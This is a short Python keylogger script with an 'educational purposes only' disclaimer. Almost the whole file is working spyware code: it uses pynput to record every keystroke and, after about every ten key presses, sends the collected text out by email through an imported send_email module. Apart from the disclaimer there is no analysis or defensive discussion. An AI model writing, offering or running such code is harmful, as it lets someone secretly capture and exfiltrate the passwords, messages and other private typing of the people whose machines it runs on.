# Author: Onyonka Maeri
# Date: 2024-06-01
# WARNING:
# This script is intended for educational purposes only.
# Unauthorized use of this script on systems you do not own or
# have explicit permission to test is illegal and unethical.
# Use responsibly and within the bounds of all applicable laws.



import pynput
from pynput.keyboard import Key, Listener
import send_email  # Make sure to have this script on hand(send_email.py)

count = 0
keys = []

def on_press(key):
    print(key, end=" ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count +=1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message= " "
    for key in keys:
        k = key.replace("'", " ")
        if key =="Key.space":
            k = " "
        elif key.find("key")> 0:
            k = " "
        message +=k
    print(message)
    send_email.sendEmail(message)

def on_release(key):
    if key ==Key.esc:
        return False

with Listener(on_press=on_press, on_release= on_release) as listener:
    listener.join()

